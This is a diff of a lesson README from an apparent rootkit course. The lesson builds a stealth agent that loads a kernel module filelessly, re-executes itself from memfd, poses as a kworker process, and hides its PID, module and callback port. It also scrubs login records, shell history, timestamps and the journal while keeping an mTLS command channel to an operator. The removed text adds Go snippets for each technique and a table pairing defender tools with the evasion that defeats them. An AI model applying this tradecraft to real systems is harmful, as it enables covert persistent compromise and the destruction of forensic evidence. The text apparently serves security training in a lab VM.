@@ -1,174 +1,213 @@
-# M03: Ghost
+# M03: Integrate the Deployment Path
 
-L20 through L24 each solved one visibility problem.
-Now integrate all of them into a single agent that leaves no trace.
-Run every defender tool an analyst would use.
-Find nothing.
+L20 through L24 implemented individual deployment controls.
+M03 combines them into one agent and makes their dependencies explicit.
 
-## The ghost checklist
+The challenge is ordering.
+The module must be active before it can hide anything.
+Re-execution replaces the current program and never returns.
+The callback must exist before its real local port is known.
+Cleanup must not break the command channel used to verify the result.
 
-```text
-  Defender tool      What it finds         Tradecraft that defeats it
-  -----------------------------------------------------------------------
-  lsmod              kernel module          module hiding (mkdir h.m)
-  ps aux             agent process          process masquerade ([kworker])
-  ss -tlnp           listening port         port hiding (mkdir h.p)
-  ls / find          agent binary           fileless exec (memfd, L21)
-  file rklings.ko    module on disk         fileless load (memfd, L20)
-  last / who         login session          utmp scrub (L24)
-  history            typed commands         history truncate (L24)
-  stat               timestamps             timestomping (L24)
-  cat /proc/pid/..   process details        PR_SET_DUMPABLE=0 (L23)
-  coredumpctl        crash dumps            RLIMIT_CORE=0 (L23)
-  journalctl         system journal         journal vacuum (L24)
-  /proc/pid/comm     process name           prctl PR_SET_NAME (L23)
-```
+## What you will observe
 
-## Execution order
-
-The agent must perform these steps in the right sequence.
-Each step depends on the previous ones being complete.
+The completed agent starts from a staged executable, loads the embedded module,
+re-executes from memory, connects over mTLS, and remains controllable while the
+selected discovery paths omit it:
 
 ```text
-  1. Connect to server over mTLS          (L15)
-  2. Receive DEPLOY command
-  3. Escalate to root                     (mkdir rklings.e)
-  4. Load .ko from memory (memfd)         (L20: MemfdCreate + FinitModule)
-  5. Hide the module                      (mkdir rklings.h.m)
-  6. Re-exec self from memory (memfd)     (L21: MemfdCreate + Exec)
-  7. Masquerade as kworker                (L23: prctl PR_SET_NAME)
-  8. Disable dumps                        (L23: PR_SET_DUMPABLE=0, RLIMIT_CORE=0)
-  9. Hide own PID                         (mkdir rklings.h.i.<pid>)
-  10. Hide server port                    (mkdir rklings.h.p.443)
-  11. Scrub utmp/wtmp                     (L24: scrubUtmp)
-  12. Scrub history                       (L24: clearHistory)
-  13. Timestomp any files touched         (L24: timestomp)
-  14. Vacuum journal                      (L24: tamperJournal)
-  15. Clear environment                   (L24: os.Clearenv)
-  16. Enter command loop                  (L17: dispatch)
+operator                     victim observations
+
+PING -> PONG                 module absent from lsmod
+SHELL id -> uid=0            PID absent from ps
+STATUS -> real local port    port absent from procfs and ss
+                             launcher absent from the filesystem
+                             /proc/PID/exe reports a deleted memfd
 ```
 
-After step 16, the agent is invisible and operational.
-The server can send commands.
-The kernel module hides everything.
-No forensic artifact remains.
+These are narrow controls over named observation paths.
+They do not prevent kernel memory inspection, remote logging, traffic analysis,
+or independent integrity monitoring.
 
-## You write
+## Workspace
 
-`main.go` (~200 lines):
-
-- `deploy()`: steps 3 through 15, the full ghost sequence
-- `loadModuleFromMemory(koBytes []byte)`: memfd + finit_module (L20)
-- `reexecFromMemory()`: memfd + exec /proc/self/fd/N (L21)
-- `masquerade()`: prctl PR_SET_NAME + PR_SET_DUMPABLE + RLIMIT_CORE (L23)
-- `hideAll()`: mkdir commands to hide module, PID, port (kernel bridge)
-- `scrubAll()`: utmp, history, timestamps, journal, env (L24)
-- `commandLoop()`: mTLS dispatch with all handlers (L17)
-
-The starter provides the mTLS connection and command dispatch skeleton.
-Fill in the deploy sequence and each tradecraft function.
-
-## API
-
-```go
-// Fileless module load (L20)
-fd, _ := unix.MemfdCreate("", unix.MFD_CLOEXEC)
-unix.Write(fd, koBytes)
-unix.FinitModule(fd, "", 0)
-unix.Close(fd)
-
-// Fileless self-exec (L21)
-fd, _ := unix.MemfdCreate("", 0)  // no MFD_CLOEXEC
-unix.Write(fd, selfBytes)
-unix.Exec(fmt.Sprintf("/proc/self/fd/%d", fd), os.Args, os.Environ())
-
-// Process masquerade (L23)
-unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
-unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
-unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
-
-// Kernel bridge
-os.Mkdir("/tmp/rklings.h.m", 0755)
-os.Mkdir(fmt.Sprintf("/tmp/rklings.h.i.%d", os.Getpid()), 0755)
-os.Mkdir("/tmp/rklings.h.p.443", 0755)
-
-// Anti-forensics (L24)
-os.Chtimes(path, refTime, refTime)
-os.Truncate(histPath, 0)
-// utmp scrub: walk 384-byte records, zero matching username
-exec.Command("journalctl", "--vacuum-time=1s").Run()
-os.Clearenv()
+```text
+exercises/M03-ghost
+├── go.mod
+├── go.sum
+└── main.go
 ```
 
-## Test it
+The build embeds the completed M01 module and the course certificates into the
+agent.
+Complete the deployment TODOs in `main.go`; no standalone module is staged in
+the guest.
 
-```
-$ rklings run m03
+## Follow the two process images
 
-(agent deploys, all tradecraft runs automatically)
+`unix.Exec` does not start a child process.
+It replaces the program running in the current PID.
+Successful execution therefore divides deployment into two passes through
+`main`:
 
-$ rklings validate m03
-  [+] agent responds to PING
-  [+] lsmod: no rklings module
-  [+] ps aux: no agent process
-  [+] ss -tlnp: no port 443 visible
-  [+] find / -name agent: no binary found
-  [+] last: no login record
-  [+] /proc/<pid>/dumpable: 0
-  [+] coredumpctl: no dump possible
-  [+] timestamps blend with system files
-  [+] history: empty
-  [+] journal: clean
-  PASS
-```
+```text
+FIRST PROCESS IMAGE                    MEMFD PROCESS IMAGE
 
-In the VM, running defender tools manually:
-
-```
-student@vm:~$ lsmod | grep rklings
-(no output)
-student@vm:~$ ps aux | grep -v grep | grep agent
-(no output)
-student@vm:~$ ss -tlnp | grep 443
-(no output)
-student@vm:~$ find / -name "agent" -o -name "rklings.ko" 2>/dev/null
-(no output)
-student@vm:~$ last | grep student
-(no output)
-student@vm:~$ cat ~/.bash_history
-(empty)
++-------------------------+           +-------------------------+
+| staged agent            |           | same PID, new program   |
+| /rklings/agent          |           | /proc/PID/exe -> memfd  |
++------------+------------+           +------------+------------+
+             |                                     |
+             | load embedded module                | skip module load
+             | hide module                         | set process controls
+             | copy self to memfd                  | hide current PID
+             +--------------- exec --------------> | scrub selected records
+                                                   +------------+------------+
+                                                                |
+                                                                | mTLS dial
+                                                                v
+                                                   hide actual local port
 ```
 
-Meanwhile, from the server:
+The second image starts at `main` again.
+Check `/proc/self/exe` for `memfd` before loading or re-executing; without that
+guard, the agent loops forever.
 
+## Implement the deployment in dependency order
+
+### 1. Require the deployment privilege
+
+`finit_module` requires privilege, and the module that provides `rklings.e` is
+not loaded yet.
+M03 therefore runs the agent as root.
+Check the effective UID and stop with a clear error if that precondition is not
+met; escalation cannot come from a control plane that does not exist yet.
+
+### 2. Load the embedded module from memory
+
+Create a memfd with `MFD_CLOEXEC`, write all embedded module bytes, call
+`FinitModule`, and close the descriptor on every path:
+
+```text
+embedded rklings.ko -> memfd -> finit_module -> running module
 ```
-rklings> ping
-PONG (8ms)
-rklings> shell whoami
-root
-rklings> shell uname -r
-7.0.0-38-generic
+
+`unix.Write` may write fewer bytes than requested.
+Continue until every byte is written; otherwise `finit_module` receives a
+truncated ELF object.
+
+The descriptor is only a loading source, so closing it during a later `exec` is
+correct.
+
+### 3. Hide the module, then re-execute the agent
+
+The module can accept `rklings.h.m` only after it has loaded.
+Send that command, copy `/proc/self/exe` into a second memfd, and execute
+`/proc/self/fd/<fd>`.
+
+Do not use `MFD_CLOEXEC` for the executable memfd.
+The kernel still needs that descriptor while replacing the process image.
+
+### 4. Apply process controls in the new image
+
+After the memfd guard skips steps 2 and 3:
+
+1. set `comm` to `[kworker/0:1]`;
+2. set `PR_SET_DUMPABLE` to zero;
+3. set both `RLIMIT_CORE` values to zero; and
+4. hide the current PID through `rklings.h.i.<pid>`.
+
+Changing `comm` affects one displayed name.
+The process remains a userspace process with mappings, descriptors, credentials,
+and network activity.
+
+### 5. Connect before hiding the port
+
+The kernel chooses the callback's local ephemeral port during `Dial`.
+Read it from the established `net.TCPConn` and only then send
+`rklings.h.p.<local-port>`:
+
+```text
+dial operator
+     |
+     +-- connection.LocalAddr() -> 10.0.2.15:52734
+     |
+     +-- mkdir rklings.h.p.52734
 ```
 
-The agent is there.
-You just cannot see it.
+Do not hide port 443 or 8443. Those are remote listener ports, not the local
+socket value shown in the victim's network tables.
 
-## Validate
+### 6. Clean the selected local records
 
+Compose the functions from L24:
+
+- clear matching `utmp` and `wtmp` records;
+- truncate the selected shell histories;
+- copy reference atime and mtime values;
+- rotate and vacuum the local journal; and
+- clear inherited environment variables.
+
+Keep each operation bounded to its declared record.
+For example, changing atime and mtime cannot restore ctime, and local journal
+cleanup cannot alter a remote log collector.
+
+### 7. Preserve the command channel
+
+After deployment, continue serving `PING`, `STATUS`, `SHELL`, and `DEPLOY`.
+`DEPLOY` must be repeat-safe: the memfd guard prevents another module load or
+re-exec, while already-applied process and cleanup operations remain safe to
+repeat.
+
+`STATUS` reports the actual PID, UID, dumpable state, core limit, and callback
+port.
+This supports debugging; validation still checks the victim directly rather than
+trusting that response.
+
+## Test the complete transition
+
+Run the complete transition against a disposable target:
+
+```console
+$ ./rklings validate M03
 ```
-$ rklings validate m03
-  [+] agent deployed and operational
-  [+] lsmod shows nothing
-  [+] ps shows no agent
-  [+] ss shows no port
-  [+] find shows no binary
-  [+] last shows no login
-  [+] not dumpable
-  [+] timestamps clean
-  PASS
+
+The validator uses a real mTLS harness and proves that deployment does not break
+control:
+
+```text
+> STATUS
+PID=1234 UID=0 DUMPABLE=0 CORE=0 PORT=52734
+> PING
+PONG
+> SHELL id
+uid=0(root) gid=0(root) groups=0(root)
+.
+> DEPLOY
+OK
+> PING
+PONG
+```
+
+The second `PING` proves that repeating deployment preserved the session.
+
+The validator observes the victim rather than trusting agent status fields:
+
+```text
+[+] module absent from lsmod
+[+] selected PID absent from ps
+[+] callback port absent from procfs and ss
+[+] launcher absent from the filesystem
+[+] selected login record absent
+[+] agent is not dumpable
+[+] selected timestamps match their reference
+[+] agent still responds to commands
+PASS
 ```
 
 ## Next
 
-P00 takes the ghost agent to production: real domain, real target, real
-obfuscation, build hardening with garble.
+M03 proves one integrated deployment against a real command channel.
+P00 keeps these mechanisms and adds the complete multi-target operator,
+reconnect and singleton handling, durable boot lifecycle, browser workflow, and
+final end-to-end verification.
